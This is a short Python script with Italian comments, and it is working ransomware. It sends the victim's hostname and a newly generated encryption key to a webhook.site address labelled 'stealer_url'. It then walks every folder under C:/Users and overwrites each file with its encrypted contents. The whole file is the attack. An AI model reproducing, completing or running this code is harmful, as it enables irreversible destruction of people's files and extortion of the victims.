import os
from cryptography.fernet import Fernet
import socket
import requests

# chiave generata con AES
key = Fernet.generate_key()


def encrypt_directory(directory_path):
    try:
        # scorre tutti i file dalla cartella directory_path
        for file in os.listdir(directory_path):
            # path assoluto del file
            file_path = os.path.join(directory_path, file)

            # controlla se oggetto è file o cartella
            if os.path.isfile(file_path):
                # legge i byte del file
                with open(file_path, "rb") as thefile:
                    contents = thefile.read()
                    contents_encrypted = Fernet(key).encrypt(contents)  # codifica i file con la chiave
                with open(file_path, "wb") as thefile:
                    # sovrascrive il file
                    thefile.write(contents_encrypted)

            elif os.path.isdir(file_path):
                print(f"Oh, una cartella: {file_path}")
                encrypt_directory(file_path)

        print("Fatto!")

    except Exception as e:
        print(f"Errore durante la crittografia della cartella: {str(e)}")


def main():
    try:
        # si prende il nome dell'host
        nomeHost = socket.gethostname()
        host = "nome host: {}".format(nomeHost).encode()

        # crea file temporaneo in cui si salva chiave e nome host
        with open("thekey.key", "wb") as thekey:
            mex = host + " - ".encode() + "chiave: ".encode() + key + "\n".encode()
            thekey.write(mex)

        # url a cui invio i dati
        stealer_url = "https://webhook.site/924a1366-b794-460f-a0fb-c3d6afd7b259"

        with open("thekey.key", "rb") as thekey:
            r = requests.post(url=stealer_url, data=thekey)

        directory_path = "C:/Users"  # [C://Users - per windows] percorso della directory da crittografare
        encrypt_directory(directory_path)

    except Exception as e:
        print(f"Errore durante l'esecuzione del programma: {str(e)}")


if __name__ == '__main__':
    main()
